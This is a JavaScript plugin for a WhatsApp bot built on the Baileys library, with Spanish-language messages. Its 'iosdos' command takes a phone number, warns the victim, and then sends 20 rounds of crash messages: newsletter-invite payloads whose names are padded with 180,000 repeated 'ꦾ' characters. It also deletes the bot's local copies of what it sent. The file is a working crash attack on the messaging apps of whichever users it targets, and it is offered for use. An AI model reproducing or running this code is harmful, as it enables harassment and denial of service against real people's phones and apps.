import fs from 'fs';
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const FILE_PATH = './mensajes_guardados.json';

function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let handler = async (m, { conn, args, command }) => {
  try {
    if (!args[0]) return m.reply('❌ Debes proporcionar un número. Ejemplo:\n*.iosdos +55425277552*');

    const normalize = jid => jid.replace(/\D/g, '') + '@s.whatsapp.net';
    const targetJid = normalize(args[0]);

    // Solo el número del bot puede usarlo
    if (m.sender !== conn.user.jid) {
      return m.reply('❌ Solo el número del bot puede usar este comando.');
    }

    // Enviar advertencia
    await conn.sendMessage(targetJid, {
      text: '🚨 Hey salte del chat o te dará crash. Tienes 30 segundos.',
    });

    setTimeout(async () => {
      if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
      const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
      if (!mensaje?.message) return m.reply('❌ El archivo está dañado o incompleto.');

      for (let i = 0; i < 20; i++) {
        // 1️⃣ Reenviar mensaje guardado
        const reenviado = await conn.copyNForward(targetJid, mensaje, true);

        // Eliminar localmente
        await conn.sendMessage(conn.user.id, {
          delete: {
            remoteJid: targetJid,
            fromMe: true,
            id: reenviado.key.id,
            participant: conn.user.id
          }
        });

        // 2️⃣ Generar y enviar mensaje tipo canal
        const travas = 'ꦾ'.repeat(90000);
        const canalMessage = {
          newsletterAdminInviteMessage: {
            newsletterJid: "120363282786345717@newsletter",
            newsletterName: "🗣🗣🗣🗣" + travas + travas,
            jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
            caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
            inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
          }
        };

        const generado = await generateWAMessageFromContent(targetJid, canalMessage, {
          userJid: conn.user.id
        });

        await conn.relayMessage(targetJid, generado.message, { messageId: generado.key.id });

        await conn.sendMessage(conn.user.id, {
          delete: {
            remoteJid: targetJid,
            fromMe: true,
            id: generado.key.id,
            participant: conn.user.id
          }
        });

        await wait(500); // Evita sobrecarga
      }

      await conn.sendMessage(m.chat, {
        text: `✅ Los 20 mensajes fueron enviados correctamente a ${args[0]}.`
      }, { quoted: m });

    }, 30000); // Esperar 30 segundos

  } catch (e) {
    console.error('[ERROR iosdos]:', e);
    return m.reply('❌ Error:\n' + (e.message || e));
  }
};

handler.command = ['iosdos'];
export default handler;